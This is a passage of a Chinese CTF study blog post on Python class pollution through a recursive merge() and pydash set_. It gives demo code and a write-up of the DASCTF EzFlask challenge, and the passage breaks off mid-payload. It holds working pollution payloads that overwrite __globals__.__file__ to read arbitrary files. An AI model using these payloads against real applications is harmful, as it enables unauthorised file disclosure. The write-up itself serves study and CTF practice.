            "content_html": "<h1 id=\"python原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#python原型链污染\">#</a> python 原型链污染</h1>\n<p>​\t\t后面会有跟着 Article_kelp 慢慢操作的，前面先面向题目学习。</p>\n<h2 id=\"背景\"><a class=\"markdownIt-Anchor\" href=\"#背景\">#</a> 背景：</h2>\n<p>​\t\t国赛遇到了这个考点，然后之后的 DASCTF 夏季挑战赛也碰到了，抓紧粗略学一手，学了 JavaScript 之后再深究原型链污染。</p>\n<h2 id=\"简介\"><a class=\"markdownIt-Anchor\" href=\"#简介\">#</a> 简介：</h2>\n<p>​\t\tpython 中的原型链污染是指通过修改对象原型链中的属性，对程序的行为产生以外影响或利用漏洞进行攻击的一种技术。</p>\n<p>​\t\t在 Python 中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p>\n<p>​\t\t这个知识点应用的范围比较小，仅当题目中出现 <code>utils</code>  的 <code>merge</code>  或 <code>Pydash(5.1.2)</code>  模块中的 <code>set</code>  和 <code>set_with</code>  函数才会用上。</p>\n<h2 id=\"merge没遇到过具体题型先简单说下\"><a class=\"markdownIt-Anchor\" href=\"#merge没遇到过具体题型先简单说下\">#</a> merge（没遇到过具体题型，先简单说下）：</h2>\n<p>​\t\t首先是下面这个程序，可以再 merge 打个断点，debug 试试看：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">father</span>:</span><br><span class=\"line\">    secret = <span class=\"string\">&quot;hello&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">son_a</span>(<span class=\"title class_ inherited__\">father</span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">son_b</span>(<span class=\"title class_ inherited__\">father</span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\">instance = son_b()</span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__class__&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__base__&quot;</span> : &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;secret&quot;</span> : <span class=\"string\">&quot;world&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(son_a.secret)</span><br><span class=\"line\"><span class=\"comment\">#hello</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(instance.secret)</span><br><span class=\"line\"><span class=\"comment\">#hello</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(son_a.secret)</span><br><span class=\"line\"><span class=\"comment\">#world</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(instance.secret)</span><br><span class=\"line\"><span class=\"comment\">#world</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(father.secret)</span><br><span class=\"line\"><span class=\"comment\">#world</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t这就是一个简单的污染 father 类的 secret 属性的一个程序，可以看到的是，最后 father.secret 确实是被污染了。</p>\n<p>​\t\t当然，内置属性例如 __str__，</p>\n<p>​\t<strong>特别注意：</strong></p>\n<p>​\t\t并不是所有的类的属性都可以被污染，如 <code>Object</code>  的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p>\n<blockquote>\n<p><strong>大佬是这么说的</strong></p>\n<p>通过断点调试可以看出这个 merge 函数在走到 hasattr 处，由于我们的 payload 是一层字典套一层字典，就会递归调用 merge，并且由于 getattr (dst,k)，dst 就在一直按着 payload 的键发生变化，从到类，再到父类，最后把父类的 secret 赋值为 polluted，成功实现了原型链污染。</p>\n<p>payload 也很好理解，其实就是利用了 python 的链式继承关系，最后找到这个类即可，和 SSTI 通过链式继承关系找 os 模块很像。</p>\n<p>类的内置属性，如 <code>__str__</code> 也可以被污染，但是需要注意，并不是所有类的属性都可以被污染，比如 <code>Object</code>  就无法被污染。</p>\n</blockquote>\n<h2 id=\"pydash512\"><a class=\"markdownIt-Anchor\" href=\"#pydash512\">#</a> pydash(5.1.2)：</h2>\n<p>​\t\t由于暂时不会 Sanic 框架的编写，所以先暂时用下 flask 框架， 差距应该不大。</p>\n<p>​\t\t先看看下面这个代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pydash <span class=\"keyword\">import</span> set_</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Father</span>:</span><br><span class=\"line\">    secret_value = <span class=\"string\">&quot;safe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Pollution</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">pollutant = Pollution()</span><br><span class=\"line\">father = Father()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;key&quot;</span> : <span class=\"string\">&quot;__class__.__init__.__globals__.father.secret_value&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;value&quot;</span> : <span class=\"string\">&quot;polluted&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">key = payload[<span class=\"string\">&quot;key&quot;</span>]</span><br><span class=\"line\">value = payload[<span class=\"string\">&quot;value&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(father.secret_value)</span><br><span class=\"line\"><span class=\"comment\">#safe</span></span><br><span class=\"line\">set_(pollutant,key, value)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(father.secret_value)</span><br><span class=\"line\"><span class=\"comment\">#polluted</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t如上，我们最后成功污染了 Father 类的 secret_value 属性，大概思路就是通过 key 里的这个链子去找到 father.secret_value 这个属性，然后进行污染，污染为 value 的值。</p>\n<p>​\t\t也正因为如此，所以写一个 Web 服务来试试看：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> pydash <span class=\"keyword\">import</span> set_</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Pollute</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_world</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(__file__).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/pollute&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Pollution</span>():</span><br><span class=\"line\">    payload = &#123;</span><br><span class=\"line\">        <span class=\"string\">r&quot;key&quot;</span>: <span class=\"string\">r&quot;__init__.__globals__.__file__&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">r&quot;value&quot;</span>: <span class=\"string\">r&quot;D:\\html study\\PyCharm Project\\flask_pydash1\\flag&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    key = payload[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">    value = payload[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\">    pollute = Pollute()</span><br><span class=\"line\">    set_(pollute,key,value)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Finished pollute &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, port=<span class=\"number\">5000</span>,debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t不知为何，这里写的 Web 服务中，Pollution () 这里传入 reqeust 参数总是会出错，所以这里就用这种方式直接规定了 key 和 value 的值，作为一种输入方式。</p>\n<p>​\t\t首先第一次访问根路由，得到的页面如下：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/188c10d495a342d4927f7d8a8b841d58.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t之后，尝试访问下 /pollute 路由，返回了一个 Finished pollute ，随后再去访问下根路由，得到的如下：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/e35d4eadef714422b7670dcc405fc905.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t成功读取到了我提前准备的 flag。</p>\n<p>​\t\t原因就是因为在__globals__里找到了__file__属性，然后才能进行污染。</p>\n<h2 id=\"dasctf-2023-0x401七月暑期挑战赛ezflask\"><a class=\"markdownIt-Anchor\" href=\"#dasctf-2023-0x401七月暑期挑战赛ezflask\">#</a> [DASCTF 2023 &amp; 0X401 七月暑期挑战赛] EzFlask：</h2>\n<p>​\t\t（小声嘀咕）：前面才刚说了没遇到 merge 的题，这就遇到了。</p>\n<p>​\t\t首先，打开就是源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> uuid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, session</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> black_list</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.secret_key = <span class=\"built_in\">str</span>(uuid.uuid4())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> black_list:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">user</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.username = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        self.password = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">self, data</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.username == data[<span class=\"string\">&#x27;username&#x27;</span>] <span class=\"keyword\">and</span> self.password == data[<span class=\"string\">&#x27;password&#x27;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">Users = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">register</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.data:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> check(request.data):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">            data = json.loads(request.data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;username&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data <span class=\"keyword\">or</span> <span class=\"string\">&quot;password&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">            User = user()</span><br><span class=\"line\">            merge(data, User)</span><br><span class=\"line\">            Users.append(User)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Success&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.data:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            data = json.loads(request.data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;username&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data <span class=\"keyword\">or</span> <span class=\"string\">&quot;password&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Failed&quot;</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> user <span class=\"keyword\">in</span> Users:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> user.check(data):</span><br><span class=\"line\">                    session[<span class=\"string\">&quot;username&quot;</span>] = data[<span class=\"string\">&quot;username&quot;</span>]</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Success&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Failed&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Failed&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>,methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(__file__, <span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&quot;0.0.0.0&quot;</span>, port=<span class=\"number\">5010</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t审计一下，发现了几个点，首先是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>\n<p>​\t\t就像最开始说的那样，存在 merge 函数，然后下一个有用的信息是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>,methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(__file__, <span class=\"string\">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>\n<p>​\t\t读取了内置属性 __file__ 的值，最后一个重要的信息是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">register</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.data:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> check(request.data):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">            data = json.loads(request.data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;username&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data <span class=\"keyword\">or</span> <span class=\"string\">&quot;password&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">            User = user()</span><br><span class=\"line\">            merge(data, User)</span><br><span class=\"line\">            Users.append(User)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Success&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t这里发现，在该函数中调用了 merge () 函数，并且，data 可控，那么，payload 应该就显而易见了：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;username&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;a&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;password&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;b&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;__class__&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;__init__&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;__globals__&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                <span class=\"attr\">&quot;__file__&quot;</span> <span class=\"punctuation\">:</span> <span 